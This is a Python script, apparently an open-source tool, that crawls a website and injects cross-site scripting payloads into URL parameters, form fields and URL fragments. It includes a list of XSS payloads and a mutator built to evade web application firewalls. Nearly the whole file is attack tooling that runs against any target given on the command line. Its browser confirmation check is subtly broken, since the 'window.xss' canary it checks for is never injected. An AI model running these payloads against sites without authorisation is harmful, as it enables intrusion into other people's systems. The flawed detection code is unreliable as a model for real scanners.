#!/usr/bin/env python3
"""
xss_finder.py  –  Reflected + Stored + DOM XSS scanner with mini WAF-bypass mutator
Author : thednato7m
License: MIT  (use only on assets you own or have permission to test)
"""
import re, os, sys, time, html, json, itertools, random, string
import urllib.parse, urllib3, requests, tldextract, colorama
from bs4 import BeautifulSoup
from colorama import Fore, Style

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

urllib3.disable_warnings()
colorama.init(autoreset=True)

# --------------------------- CONFIG ---------------------------------
TIMEOUT        = 8
MAX_DEPTH      = 2
THREADS        = 15            # for URL brute-fuzz (not implemented async here – left as hook)
CHROME_HEADLESS = True
USER_AGENT     = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 XSS-Hunter/1.0"

# Confirmation payload – sets window.xss=1  (we later check via JS)
CONF_JS = "window.xss=1"

# Polyglot / WAF-bypass payload factory
BASE_PAYLOADS = [
    "'><script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>",
    "\"><iframe/src=javascript:alert(1)>",
    "'><details/open/ontoggle=alert(1)>",
    "\"><math><mtext></mtext><mstyle onload=alert(1)>",
    # classic polyglot
    "\">'><script /src=data:,alert(1)></script>",
    "\">'><script>alert(1)/*",
    "\"><script>confirm(1)</script>",
]

# Mutations: case, tag swap, protocol, comment breaker, back-tick, etc.
MUTATIONS = [
    lambda p: p.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"),
    lambda p: p.replace("javascript:", "JaVaScRiPt:"),
    lambda p: p.replace("onerror=", "onerror=``//"),
    lambda p: p.replace(">", "/**/>"),
    lambda p: p.replace("alert", "confirm"),   # simple semantic swap
    lambda p: p.replace("alert(1)", "eval('ale'+'rt(1)')"),
    lambda p: p.replace("<svg", "<svg//"),     # break naive regex
    lambda p: p.replace("<img", "<i\\mg"),     # escape letter
]

# --------------------------- UTILS ----------------------------------
def log(s, color=Fore.WHITE):
    print(color + s)

def same_origin(url1, url2):
    return tldextract.extract(url1).registered_domain == tldextract.extract(url2).registered_domain

def get_driver():
    opts = Options()
    if CHROME_HEADLESS: opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument(f"user-agent={USER_AGENT}")
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(TIMEOUT)
    return driver

# ------------------- WAF BYPASS PAYLOAD FACTORY ---------------------
def gen_payloads():
    out = set()
    for base in BASE_PAYLOADS:
        out.add(base)
        for mut in MUTATIONS:
            out.add(mut(base))
    # add a few random case flips
    for _ in range(20):
        p = random.choice(list(out))
        out.add(''.join(random.choice([k.upper(), k.lower()]) if k.isalpha() else k for k in p))
    return list(out)

PAYLOADS = gen_payloads()

# ------------------- DETECTION HELPERS ------------------------------
def reflected(payload, text):
    return html.unescape(payload) in text or payload in text

def dom_xss_via_driver(driver, url):
    """Inject a canary and see if window.xss becomes 1"""
    driver.get(url)
    time.sleep(1)
    try:
        flag = driver.execute_script("return window.xss === 1")
        return bool(flag)
    except:
        return False

# ------------------- CRAWL + FUZZ -----------------------------------
class Hunter:
    def __init__(self, start_url):
        self.start = start_url
        self.visited = set()
        self.findings = []
        self.driver = get_driver()
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": USER_AGENT})
        self.s.verify = False

    def run(self):
        log(f"[+] Crawling + fuzzing {self.start}", Fore.CYAN)
        self.crawl(self.start, 0)
        self.driver.quit()
        self.report()

    # ---------- crawl ----------
    def crawl(self, url, depth):
        if url in self.visited or depth > MAX_DEPTH:
            return
        self.visited.add(url)
        try:
            resp = self.s.get(url, timeout=TIMEOUT)
        except Exception as e:
            log(f"[-] crawl error {url} : {e}", Fore.RED)
            return
        forms = self.get_forms(resp.text, url)

        # 1) Reflected in URL params
        self.test_url_params(url, resp.text)

        # 2) Forms (both GET/POST) – treat as potential stored/reflected
        for form in forms:
            self.test_form(form)

        # 3) DOM – open page in Chrome and inject canary via location.hash
        self.test_dom(url)

        # enqueue links
        if depth < MAX_DEPTH:
            soup = BeautifulSoup(resp.text, "html.parser")
            for a in soup.find_all("a", href=True):
                nxt = urllib.parse.urljoin(url, a["href"]).split("#")[0]
                if same_origin(url, nxt) and nxt not in self.visited:
                    self.crawl(nxt, depth+1)

    # ---------- URL params ----------
    def test_url_params(self, url, original_text):
        pr = urllib.parse.urlparse(url)
        if not pr.query: return
        params = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        for key in params:
            for p in PAYLOADS:
                new_q = urllib.parse.urlencode({**params, key: p}, doseq=True)
                test  = urllib.parse.urlunparse(pr._replace(query=new_q))
                try:
                    r = self.s.get(test, timeout=TIMEOUT)
                    if reflected(p, r.text):
                        # confirm via browser
                        self.driver.get(test + "#" + urllib.parse.quote(p))
                        time.sleep(1)
                        if dom_xss_via_driver(self.driver, test):
                            self.log_finding("REFLECTED+DOM", test, param=key, payload=p)
                        else:
                            self.log_finding("REFLECTED", test, param=key, payload=p)
                except:
                    pass

    # ---------- forms ----------
    def get_forms(self, text, base_url):
        soup = BeautifulSoup(text, "html.parser")
        forms = []
        for f in soup.find_all("form"):
            action = urllib.parse.urljoin(base_url, f.get("action") or "")
            method = f.get("method", "get").lower()
            inputs = [(i.get("name"), i.get("value","")) for i in f.find_all(["input","textarea","select"]) if i.get("name")]
            forms.append({"action":action, "method":method, "inputs":inputs})
        return forms

    def test_form(self, form):
        for p in PAYLOADS:
            data = {name: p for name, _ in form["inputs"]}
            try:
                if form["method"] == "post":
                    r = self.s.post(form["action"], data=data, timeout=TIMEOUT)
                else:
                    r = self.s.get(form["action"], params=data, timeout=TIMEOUT)
                # revisit page to see if stored
                time.sleep(1)
                r2 = self.s.get(form["action"], timeout=TIMEOUT)
                if reflected(p, r2.text):
                    # confirm
                    self.driver.get(form["action"])
                    time.sleep(1)
                    if dom_xss_via_driver(self.driver, form["action"]):
                        self.log_finding("STORED+DOM", form["action"], payload=p)
                    else:
                        self.log_finding("STORED", form["action"], payload=p)
            except:
                pass

    # ---------- DOM via hash ----------
    def test_dom(self, url):
        for p in PAYLOADS:
            try:
                self.driver.get(url + "#" + urllib.parse.quote(p))
                time.sleep(1)
                if dom_xss_via_driver(self.driver, url):
                    self.log_finding("DOM", url, payload=p)
                    break  # one hit per page is enough
            except:
                pass

    # ---------- logging ----------
    def log_finding(self, typ, url, **kw):
        f = {"type":typ, "url":url, **kw}
        self.findings.append(f)
        log(f"[+] {typ} XSS  ->  {url}  param={kw.get('param','')} payload={kw.get('payload','')}", Fore.GREEN)

    def report(self):
        log("\n========== FINAL REPORT ==========", Fore.CYAN)
        if not self.findings:
            log("No XSS indicators found.", Fore.YELLOW)
        for f in self.findings:
            log(json.dumps(f, indent=2), Fore.MAGENTA)

# --------------------------- MAIN ----------------------------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xss_hunter.py https://target.com")
        sys.exit(1)
    Hunter(sys.argv[1]).run()
